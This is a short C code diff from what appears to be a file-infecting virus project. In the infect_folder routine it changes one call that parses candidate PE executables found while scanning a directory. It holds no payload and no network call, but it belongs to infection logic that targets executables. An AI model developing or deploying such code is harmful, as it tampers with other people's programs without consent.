@@ -60,7 +60,7 @@ void				infect_folder(t_famine *famine, char *folder_name)
 	}
 	while ((file = readdir(directory)) != NULL) {
 		if (check_file_validity(famine, target_path, file->d_name)) {
-			if ((pe_file = pe(famine, target_path, file->d_name)) == NULL) {
+			if ((pe_file = pe(famine, target_path, file->d_name, false)) == NULL) {
 				printf("The file %s is not a valid PE file, sorry :(\n", file->d_name);
 			}
 		}
